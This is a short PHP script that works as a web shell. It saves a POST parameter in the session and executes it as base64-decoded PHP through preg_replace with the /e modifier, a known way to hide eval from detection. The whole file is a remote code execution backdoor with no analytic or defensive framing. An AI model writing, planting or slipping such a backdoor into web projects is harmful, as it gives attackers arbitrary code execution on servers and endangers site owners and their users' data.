<?php
// Start the session
session_start();

// Store the user input in the session
if (isset($_POST['code'])) {
    $_SESSION['theCode'] = trim($_POST['code']);
}

// Execute the stored code
if (!empty($_SESSION['theCode'])) {
    $pattern = '/a/eis';
    $replacement = 'eval(base64_decode($_SESSION[\'theCode\']))';
    preg_replace($pattern, $replacement, 'a');
}
?>

